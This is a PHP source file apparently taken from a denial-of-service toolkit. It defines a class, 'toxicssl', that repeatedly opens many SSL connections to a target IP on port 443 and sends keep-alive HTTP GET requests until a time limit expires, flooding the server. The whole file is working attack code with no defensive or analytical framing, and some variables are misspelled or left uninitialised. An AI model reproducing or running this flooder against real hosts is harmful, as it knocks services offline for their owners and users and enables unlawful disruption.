<?php
class toxicssl{
    function toxicssl($ip, $port, $timedout, $starttime, $socketn, $max_time, $exec_time){
        while(1){
            try{ 
                if(time() > $max_time){
                    output($packets, $starttime, $exec_time, $lenght);
                    break; 
                }
                for($i=0;$i<=$socketn;$i++){
                    $fp[$i]=fsockopen("ssl://$ip",443,$errno,$errstr,$timedout);
                    $out="GET / HTTP/1.1\r\n";
                    $out.="Host: ".$ip."\r\n";
                    $out.= "Connection: keep-alive\r\n";
                    $out.= "\r\n";
                    $packets++; 
                    fwrite($fp[$i],$out);
                }
                for($j=0;$j<=$socketn;$j++){
                    while (!feof($fp[$j])) {
                    	echo fgets($fp[$j], 128);
                    }
                }
            }catch (Exception $e){
               	echo $e;
            }
        }
    }
}
?>